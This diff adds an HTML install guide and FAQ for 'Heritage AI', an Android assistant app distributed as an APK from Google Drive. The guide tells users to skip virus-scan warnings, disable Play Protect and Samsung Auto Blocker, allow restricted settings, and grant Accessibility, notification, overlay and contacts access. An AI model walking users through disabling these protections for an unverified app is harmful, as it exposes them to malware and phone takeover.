@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Heritage AI – Setup Guide &amp; FAQ</title>
+<meta name="description" content="Step-by-step guide to install Heritage AI on Android, switch on every permission, and fix common problems on Samsung, Xiaomi, Poco, Tecno, Infinix, itel and more.">
+<style>
+  :root {
+    --bg: #f6f2ff; --card: #ffffff; --ink: #1b1233; --muted: #5d5280;
+    --line: #e1d7f7; --accent: #6d28d9; --accent-2: #8b5cf6; --soft: #efe8ff;
+    --ok: #0f766e; --warn-bg: #fff4d6; --warn-ink: #6b4a00; --code: #f0e9ff;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0c0716; --card: #150e26; --ink: #efe9ff; --muted: #a99bd0;
+      --line: #2b1f4a; --accent: #b58cff; --accent-2: #8b5cf6; --soft: #1d1337;
+      --ok: #5eead4; --warn-bg: #2b2108; --warn-ink: #ffd98a; --code: #1f1538;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0c0716; --card: #150e26; --ink: #efe9ff; --muted: #a99bd0;
+    --line: #2b1f4a; --accent: #b58cff; --accent-2: #8b5cf6; --soft: #1d1337;
+    --ok: #5eead4; --warn-bg: #2b2108; --warn-ink: #ffd98a; --code: #1f1538;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; scroll-padding-top: 72px; }
+  body {
+    margin: 0; background: var(--bg); color: var(--ink);
+    font: 16px/1.6 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    padding-top: env(safe-area-inset-top, 0px);
+    padding-bottom: env(safe-area-inset-bottom, 0px);
+  }
+  .mono { font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace; }
+  header.top {
+    position: sticky; top: env(safe-area-inset-top, 0px); z-index: 10;
+    background: color-mix(in srgb, var(--bg) 88%, transparent);
+    backdrop-filter: blur(8px); border-bottom: 1px solid var(--line);
+  }
+  .bar { max-width: 760px; margin: 0 auto; padding: 10px 16px; display: flex; align-items: center; gap: 10px; }
+  .brand { font-weight: 700; flex: 1; }
+  .brand span { color: var(--accent); }
+  .btn {
+    display: inline-block; border: 0; cursor: pointer; text-decoration: none;
+    background: var(--accent-2); color: #fff; padding: 10px 16px; border-radius: 10px;
+    font: inherit; font-weight: 600;
+  }
+  .btn.ghost { background: var(--soft); color: var(--accent); }
+  .btn.small { padding: 6px 12px; font-size: 14px; }
+  main { max-width: 760px; margin: 0 auto; padding: 20px 16px 60px; }
+  .hero { padding: 18px 0 8px; }
+  .hero h1 { font-size: clamp(26px, 6vw, 38px); line-height: 1.15; margin: 8px 0; }
+  .hero h1 em { font-style: normal; color: var(--accent); }
+  .hero p { color: var(--muted); margin: 6px 0 14px; }
+  .chips { display: flex; flex-wrap: wrap; gap: 8px; margin: 14px 0 4px; }
+  .chip { background: var(--soft); color: var(--accent); border-radius: 999px; padding: 4px 12px; font-size: 13px; text-decoration: none; }
+  .progress { height: 8px; background: var(--soft); border-radius: 99px; overflow: hidden; margin: 14px 0 4px; }
+  .progress i { display: block; height: 100%; width: 0; background: var(--accent-2); transition: width .3s; }
+  .pmeta { color: var(--muted); font-size: 13px; }
+  section { margin-top: 28px; }
+  h2 { font-size: 22px; margin: 0 0 10px; }
+  h2 .n { display: inline-block; min-width: 30px; height: 30px; line-height: 30px; text-align: center; border-radius: 8px; background: var(--accent-2); color: #fff; font-size: 15px; margin-right: 8px; }
+  .card { background: var(--card); border: 1px solid var(--line); border-radius: 14px; padding: 14px 16px; margin: 10px 0; }
+  .steps { list-style: none; counter-reset: s; margin: 0; padding: 0; }
+  .steps li { counter-increment: s; display: flex; gap: 12px; align-items: flex-start; padding: 10px 0; border-bottom: 1px dashed var(--line); }
+  .steps li:last-child { border-bottom: 0; }
+  .steps input[type=checkbox] { margin-top: 5px; width: 20px; height: 20px; accent-color: var(--accent-2); flex: none; }
+  .steps label { flex: 1; cursor: pointer; }
+  .steps li.done label { color: var(--muted); text-decoration: line-through; }
+  .path { display: inline-block; background: var(--code); border-radius: 6px; padding: 1px 7px; font-size: 14px; }
+  .note, .warn { border-radius: 12px; padding: 10px 14px; margin: 12px 0; font-size: 15px; }
+  .note { background: var(--soft); border-left: 4px solid var(--accent-2); }
+  .warn { background: var(--warn-bg); color: var(--warn-ink); border-left: 4px solid #e0a100; }
+  details { background: var(--card); border: 1px solid var(--line); border-radius: 12px; margin: 8px 0; }
+  summary { cursor: pointer; padding: 12px 14px; font-weight: 600; list-style: none; display: flex; gap: 10px; align-items: center; }
+  summary::-webkit-details-marker { display: none; }
+  summary::after { content: "+"; margin-left: auto; color: var(--accent); font-size: 20px; line-height: 1; }
+  details[open] summary::after { content: "–"; }
+  details > div { padding: 0 14px 12px; color: var(--ink); }
+  details ul, details ol { margin: 6px 0; padding-left: 20px; }
+  #q { width: 100%; padding: 12px 14px; border-radius: 12px; border: 1px solid var(--line); background: var(--card); color: var(--ink); font: inherit; margin: 6px 0 10px; }
+  #nores { display: none; color: var(--muted); padding: 8px 2px; }
+  .help { text-align: center; padding: 22px 16px; }
+  footer { max-width: 760px; margin: 0 auto; padding: 0 16px 40px; color: var(--muted); font-size: 13px; text-align: center; }
+  footer a { color: var(--accent); }
+  @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } .progress i { transition: none; } }
+</style>
+</head>
+<body>
+
+<header class="top">
+  <div class="bar">
+    <a class="brand mono" href="index.html" style="color:inherit;text-decoration:none">Heritage<span>.AI</span> / guide</a>
+    <a class="btn ghost small" href="index.html">Home</a>
+    <a class="btn small" href="https://drive.google.com/drive/folders/1VWOgBImkbATHKTiAeRcBCFybeDRAAS_S" rel="noopener">Download</a>
+    <button class="btn ghost small" id="theme" type="button" aria-label="Switch light or dark theme">Theme</button>
+  </div>
+</header>
+
+<main>
+  <div class="hero">
+    <div class="chips mono">
+      <a class="chip" href="#install">1 · Install</a>
+      <a class="chip" href="#permissions">2 · Permissions</a>
+      <a class="chip" href="#test">3 · Test</a>
+      <a class="chip" href="#phones">Your phone</a>
+      <a class="chip" href="#faq">Fix a problem</a>
+    </div>
+    <h1>Set up <em>Heritage AI</em> in about 10 minutes</h1>
+    <p>Heritage AI is not on the Google Play Store yet, so Android needs a few extra taps the first time. Follow the steps in order and tick each one as you go.</p>
+    <div class="progress"><i id="bar"></i></div>
+    <div class="pmeta mono" id="pmeta">0 of 0 steps done</div>
+  </div>
+
+  <!-- ============ INSTALL ============ -->
+  <section id="install">
+    <h2><span class="n">1</span>Download and install</h2>
+    <div class="card">
+      <ol class="steps" data-group>
+        <li><input type="checkbox" id="s1"><label for="s1"><strong>Download the app.</strong> Tap <strong>Download</strong> (button below or on the Heritage AI home page). Pick the Google account you want to use, and you will land in Google Drive with the file. <div style="margin-top:8px"><a class="btn small" href="https://drive.google.com/drive/folders/1VWOgBImkbATHKTiAeRcBCFybeDRAAS_S" rel="noopener">↓ Download APK</a></div>
+          <div class="note">If Drive says it can’t scan the file for viruses, tap <strong>Download anyway</strong>. That is normal for apps that are not on the Play Store yet.</div></label></li>
+        <li><input type="checkbox" id="s2"><label for="s2"><strong>Turn off Play Protect scanning (for now).</strong> Open the <strong>Play Store</strong>, tap your <strong>profile picture</strong> (top right), then <span class="path mono">Play Protect</span>, tap the <strong>gear icon</strong>, and switch off <span class="path mono">Scan apps with Play Protect</span>.
+          <div class="warn">Why? Play Protect flags any app it doesn’t know. Heritage AI isn’t on the Play Store yet, so it gets flagged. Only do this for this install, and only install the file from the official Heritage AI download page.</div></label></li>
+        <li><input type="checkbox" id="s3"><label for="s3"><strong>Samsung only: switch off Auto Blocker.</strong> Go to <span class="path mono">Settings → Security and privacy → Auto Blocker</span> and turn it off. (Not a Samsung? Skip this step.)</label></li>
+        <li><input type="checkbox" id="s4"><label for="s4"><strong>Open the file and tap Install.</strong> If Android says your phone isn’t allowed to install unknown apps from this source, tap <strong>Settings</strong>, switch on <strong>Allow from this source</strong> for Drive or Chrome, then press back and tap <strong>Install</strong> again.</label></li>
+        <li><input type="checkbox" id="s5"><label for="s5"><strong>Turn protection back on.</strong> Once it is installed, switch Play Protect scanning and (on Samsung) Auto Blocker back <strong>on</strong>. You are protected again and Heritage AI keeps working.</label></li>
+      </ol>
+    </div>
+  </section>
+
+  <!-- ============ PERMISSIONS ============ -->
+  <section id="permissions">
+    <h2><span class="n">2</span>Switch on the permissions</h2>
+    <p>Heritage AI controls your phone for you, so Android asks for each permission. They are all optional, but the assistant can only do what you allow.</p>
+    <div class="card">
+      <ol class="steps" data-group>
+        <li><input type="checkbox" id="p1"><label for="p1"><strong>Open Heritage AI</strong>, accept the Terms and Privacy Policy, then tap the <strong>Settings gear</strong> (top right) and scroll to <strong>Accessibility</strong>.</label></li>
+        <li><input type="checkbox" id="p2"><label for="p2"><strong>Try to switch Accessibility on.</strong> It will refuse and say the app isn’t allowed to use this setting. That is expected on Android 13 and newer for apps installed outside the Play Store. It is also what makes the next step appear.</label></li>
+        <li><input type="checkbox" id="p3"><label for="p3"><strong>Open the app’s info page.</strong> Go to your recent apps (the button on the left, or swipe up from the bottom, depending on your phone), press and hold the Heritage AI icon, and tap <strong>App info</strong>. You can also use <span class="path mono">Settings → Apps → Heritage AI</span>.</label></li>
+        <li><input type="checkbox" id="p4"><label for="p4"><strong>Tap the three dots (⋮) at the top right</strong> and choose <span class="path mono">Allow restricted settings</span>. Confirm with your fingerprint, face or PIN.
+          <div class="note">No three dots? Go back to Heritage AI, tap the greyed-out Accessibility switch once more, then open App info again. The menu appears after you have tried to switch it on.</div></label></li>
+        <li><input type="checkbox" id="p5"><label for="p5"><strong>Go back to Heritage AI → Settings → Accessibility</strong> and switch it on. Accept the prompt.</label></li>
+        <li><input type="checkbox" id="p6"><label for="p6"><strong>Enable every other permission</strong> listed further down in Settings, one by one:
+          <ul>
+            <li><strong>Notification access</strong> – lets it read your notifications when you ask</li>
+            <li><strong>Display over other apps</strong> – the quick-answer window</li>
+            <li><strong>Modify system settings</strong> – brightness. Open <span class="path mono">Settings → Apps → Heritage AI → Change system settings</span> if needed</li>
+            <li><strong>Contacts &amp; Calling</strong> – so you can say “call Mum” or “text Ade”</li>
+            <li><strong>Microphone</strong> – voice questions and the wake word</li>
+          </ul></label></li>
+        <li><input type="checkbox" id="p7"><label for="p7"><strong>Let it run in the background.</strong> Set Battery for Heritage AI to <strong>Unrestricted</strong> (or “No restrictions”) and allow Autostart if your phone has it. Phone-specific steps are further down.</label></li>
+      </ol>
+    </div>
+  </section>
+
+  <!-- ============ TEST ============ -->
+  <section id="test">
+    <h2><span class="n">3</span>Test it</h2>
+    <div class="card">
+      <ol class="steps" data-group>
+        <li><input type="checkbox" id="t1"><label for="t1"><strong>Triple-press a volume button</strong> (three quick presses) with the screen on. The Heritage AI window should appear and start listening.</label></li>
+        <li><input type="checkbox" id="t2"><label for="t2"><strong>Ask something</strong>, like “what’s the time?”, “turn on the flashlight”, or “call [a name in your contacts]”.</label></li>
+      </ol>
+      <div class="warn"><strong>Xiaomi, Redmi and POCO:</strong> the triple-press shortcut may not work on some of these phones, because the system can block it. If it doesn’t, you can still use Heritage AI from inside the app and with the wake word. Everything else works the same.</div>
+      <p>If the triple-press works, you’re done. Enjoy! If something doesn’t, jump to <a href="#faq" style="color:var(--accent)">Fix a problem</a>.</p>
+    </div>
+  </section>
+
+  <!-- ============ PHONES ============ -->
+  <section id="phones">
+    <h2>Tips for your phone</h2>
+    <p>Phone makers add their own battery rules that can switch Heritage AI off in the background. Open yours and follow it. Menu names vary a little between versions.</p>
+
+    <details><summary>Samsung (One UI)</summary><div>
+      <ul>
+        <li>Switch <strong>Auto Blocker</strong> off while installing: <span class="path mono">Settings → Security and privacy → Auto Blocker</span>. Turn it on again afterwards.</li>
+        <li><span class="path mono">Settings → Apps → Heritage AI → Battery → Unrestricted</span>.</li>
+        <li><span class="path mono">Settings → Battery → Background usage limits</span>: remove Heritage AI from “Sleeping apps” and “Deep sleeping apps”.</li>
+      </ul></div></details>
+
+    <details><summary>Xiaomi, Redmi and POCO (MIUI / HyperOS)</summary><div>
+      <ul>
+        <li><span class="path mono">Settings → Apps → Manage apps → Heritage AI → Autostart</span>: <strong>on</strong>.</li>
+        <li>Same page, <span class="path mono">Battery saver → No restrictions</span>.</li>
+        <li>Open recent apps, press and hold the Heritage AI card and tap the <strong>lock</strong> icon so it isn’t cleaned.</li>
+        <li>In <span class="path mono">Other permissions</span> allow <strong>Display pop-up windows while running in the background</strong> and <strong>Show on lock screen</strong>.</li>
+        <li>The volume triple-press can be blocked on some versions. Use the in-app mic or wake word if so.</li>
+      </ul></div></details>
+
+    <details><summary>Tecno, Infinix and itel (HiOS / XOS / itel OS)</summary><div>
+      <ul>
+        <li>Open <span class="path mono">Settings → Apps → Heritage AI → Battery</span> and choose <strong>No restrictions</strong> or <strong>Unrestricted</strong>.</li>
+        <li>Look in Settings (or the phone-manager app) for <strong>Auto-start</strong> or <strong>Background activity</strong> and allow Heritage AI.</li>
+        <li>In recent apps, <strong>lock</strong> Heritage AI so it isn’t closed to free memory.</li>
+        <li>Menus differ slightly between models. If you get stuck, message me and tell me your phone model.</li>
+      </ul></div></details>
+
+    <details><summary>Oppo, Realme and OnePlus (ColorOS / OxygenOS)</summary><div>
+      <ul>
+        <li><span class="path mono">Settings → Battery → App battery management → Heritage AI</span>: allow <strong>background activity</strong> and <strong>auto launch</strong>; turn off sleep or deep sleep for it.</li>
+        <li>Lock the app in recent apps.</li>
+      </ul></div></details>
+
+    <details><summary>vivo and iQOO (Funtouch / OriginOS)</summary><div>
+      <ul>
+        <li><span class="path mono">Settings → Battery → Background power consumption management → Heritage AI → Allow</span>.</li>
+        <li><span class="path mono">Settings → Apps → Autostart</span>: enable Heritage AI.</li>
+      </ul></div></details>
+
+    <details><summary>Google Pixel and other stock Android</summary><div>
+      <ul>
+        <li><span class="path mono">Settings → Apps → Heritage AI → App battery usage → Unrestricted</span>.</li>
+      </ul></div></details>
+
+    <div class="note">Force-stopping an app, or letting the system force-stop it, switches its Accessibility permission off. If the triple-press stops working one day, open <span class="path mono">Settings → Accessibility → Heritage AI</span> and switch it back on.</div>
+  </section>
+
+  <!-- ============ FAQ ============ -->
+  <section id="faq">
+    <h2>Fix a problem</h2>
+    <input id="q" type="search" placeholder="Search: install, accessibility, call, brightness…" aria-label="Search the help topics" autocomplete="off">
+    <div id="faqlist">
+
+      <details><summary>It says “App not installed” or Play Protect blocked it</summary><div>
+        <ul>
+          <li>Switch off <span class="path mono">Scan apps with Play Protect</span> (Play Store → profile → Play Protect → gear), then install again.</li>
+          <li>On Samsung, also switch off <strong>Auto Blocker</strong>.</li>
+          <li>If it says the app <strong>conflicts with an existing package</strong>, uninstall the old Heritage AI first and then install the new one. Your chats on the old version will be removed.</li>
+          <li>Make sure the file finished downloading. A very small or partial file will fail.</li>
+        </ul></div></details>
+
+      <details><summary>My phone says it isn’t allowed to install unknown apps</summary><div>
+        Tap <strong>Settings</strong> on that message and switch on <strong>Allow from this source</strong> for Google Drive or Chrome (whichever opened the file). Then go back and tap <strong>Install</strong>. You can also find it at <span class="path mono">Settings → Apps → Special access → Install unknown apps</span>.</div></details>
+
+      <details><summary>The Accessibility switch won’t turn on</summary><div>
+        This is Android’s “restricted settings” protection for apps installed outside the Play Store. Open <span class="path mono">Settings → Apps → Heritage AI</span>, tap <strong>⋮</strong> (top right), choose <strong>Allow restricted settings</strong>, confirm with your fingerprint or PIN, then try again. If the three dots aren’t there, tap the greyed-out switch inside the app once first and look again.</div></details>
+
+      <details><summary>The triple volume press does nothing</summary><div>
+        <ul>
+          <li>Check that <strong>Accessibility → Heritage AI</strong> is switched on.</li>
+          <li>Set battery to <strong>Unrestricted</strong> and lock the app in recent apps (see your phone’s tips above).</li>
+          <li>Press quickly, three times, with the screen on.</li>
+          <li>Switch Accessibility off and on again, then retry.</li>
+          <li>On some Xiaomi, Redmi and POCO phones the system blocks this shortcut. Use the in-app mic or the wake word instead.</li>
+        </ul></div></details>
+
+      <details><summary>It says “No internet connection” but my data is working</summary><div>
+        <ul>
+          <li>Make sure you have the <strong>latest version</strong> of Heritage AI from the download page. Older versions can fail to connect.</li>
+          <li>Try another network (Wi-Fi or mobile data).</li>
+          <li>Open <span class="path mono">Settings → Network → Private DNS</span> and set it to <strong>Automatic</strong> (or <span class="path mono">dns.google</span>), then try again.</li>
+        </ul></div></details>
+
+      <details><summary>Brightness won’t change</summary><div>
+        Open <span class="path mono">Settings → Apps → Heritage AI → Change system settings</span> and switch <strong>Allow permission</strong> on. If it’s greyed out, use <strong>Allow restricted settings</strong> from the three-dot menu first (see the Accessibility steps), then try again. Say a number, like “set brightness to 40”.</div></details>
+
+      <details><summary>“Call Mum” or “text Ade” doesn’t work</summary><div>
+        <ul>
+          <li>In Heritage AI go to Settings and tap <strong>Contacts &amp; Calling</strong> and allow both permissions.</li>
+          <li>Say the name the way it’s saved in your contacts. If two people match, Heritage will ask which one.</li>
+          <li>Texts open your messages app with the message already typed. Tap <strong>Send</strong> to confirm.</li>
+          <li>If the name isn’t an exact match, Heritage opens the dialer instead of calling straight away, so you can check the number.</li>
+        </ul></div></details>
+
+      <details><summary>It doesn’t hear me, or hears itself talking</summary><div>
+        <ul>
+          <li>Allow the <strong>Microphone</strong> permission.</li>
+          <li>Speak close to the phone in a quiet place.</li>
+          <li>Press the mic or triple-press again while it is talking. It will stop speaking and start listening.</li>
+        </ul></div></details>
+
+      <details><summary>The wake word or shortcut stops working after a while</summary><div>
+        Your phone is closing the app to save battery. Set Battery to <strong>Unrestricted</strong>, allow <strong>Autostart</strong>, and lock the app in recent apps. See the tips for your phone above.</div></details>
+
+      <details><summary>Is it safe? Why did I have to turn off Play Protect?</summary><div>
+        Heritage AI isn’t on the Google Play Store yet, so Play Protect doesn’t recognise it and warns about it. Turn it back on straight after installing. Only install the file from the official Heritage AI download page. Your chats are stored encrypted on your phone, your contact list is never uploaded, and you can erase everything any time in <span class="path mono">Settings → Legal &amp; Privacy → Delete all my data</span>. When the app reaches the Play Store you won’t need any of these extra steps.</div></details>
+
+      <details><summary>How do I update Heritage AI?</summary><div>
+        Download the newest file from the website and install it. If Android says it <strong>conflicts</strong> with the installed one, uninstall the old version first and install the new one.</div></details>
+
+      <details><summary>How do I delete my data or uninstall?</summary><div>
+        Open <span class="path mono">Heritage AI → Settings → Legal &amp; Privacy → Delete all my data</span> to erase your chats, memories and settings. Then uninstall like any other app.</div></details>
+
+      <div id="nores">No match. Try other words, or message me below.</div>
+    </div>
+  </section>
+
+  <section class="card help">
+    <h2 style="margin-bottom:6px">Still stuck?</h2>
+    <p style="margin:0 0 14px;color:var(--muted)">Tell me your phone model and what you see on the screen, and I’ll help you sort it out.</p>
+    <a class="btn" href="https://wa.me/2349169675460?text=Hi%2C%20I%20need%20help%20setting%20up%20Heritage%20AI" rel="noopener">Message me on WhatsApp</a>
+    <p style="margin:12px 0 0"><a href="mailto:dandamdad2000@gmail.com" style="color:var(--accent)">or email dandamdad2000@gmail.com</a></p>
+  </section>
+</main>
+
+<footer>
+  Heritage AI is early-stage software and AI can make mistakes. Read the
+  <a href="privacy.html">Privacy Policy</a> and <a href="terms.html">Terms of Service</a>.
+</footer>
+
+<script>
+(function () {
+  // ---- theme toggle (remembered per visitor, optional) ----
+  var root = document.documentElement;
+  try { var t = localStorage.getItem("hg-theme"); if (t) root.setAttribute("data-theme", t); } catch (e) {}
+  document.getElementById("theme").addEventListener("click", function () {
+    var dark = getComputedStyle(root).getPropertyValue("--bg").trim().toLowerCase() === "#0c0716";
+    var next = dark ? "light" : "dark";
+    root.setAttribute("data-theme", next);
+    try { localStorage.setItem("hg-theme", next); } catch (e) {}
+  });
+
+  // ---- step checklist with progress ----
+  var boxes = Array.prototype.slice.call(document.querySelectorAll(".steps input[type=checkbox]"));
+  var bar = document.getElementById("bar"), meta = document.getElementById("pmeta");
+  function save() {
+    try { localStorage.setItem("hg-steps", JSON.stringify(boxes.filter(function (b) { return b.checked; }).map(function (b) { return b.id; }))); } catch (e) {}
+  }
+  function paint() {
+    var done = boxes.filter(function (b) { return b.checked; }).length;
+    bar.style.width = (boxes.length ? Math.round(done / boxes.length * 100) : 0) + "%";
+    meta.textContent = done + " of " + boxes.length + " steps done";
+    boxes.forEach(function (b) { b.closest("li").classList.toggle("done", b.checked); });
+  }
+  try {
+    var saved = JSON.parse(localStorage.getItem("hg-steps") || "[]");
+    boxes.forEach(function (b) { if (saved.indexOf(b.id) > -1) b.checked = true; });
+  } catch (e) {}
+  boxes.forEach(function (b) { b.addEventListener("change", function () { save(); paint(); }); });
+  paint();
+
+  // ---- FAQ search ----
+  var q = document.getElementById("q"), items = Array.prototype.slice.call(document.querySelectorAll("#faqlist details")), nores = document.getElementById("nores");
+  q.addEventListener("input", function () {
+    var term = q.value.trim().toLowerCase(), shown = 0;
+    items.forEach(function (d) {
+      var hit = !term || d.textContent.toLowerCase().indexOf(term) > -1;
+      d.style.display = hit ? "" : "none";
+      if (hit) shown++;
+    });
+    nores.style.display = shown ? "none" : "block";
+  });
+})();
+</script>
+</body>
+</html>
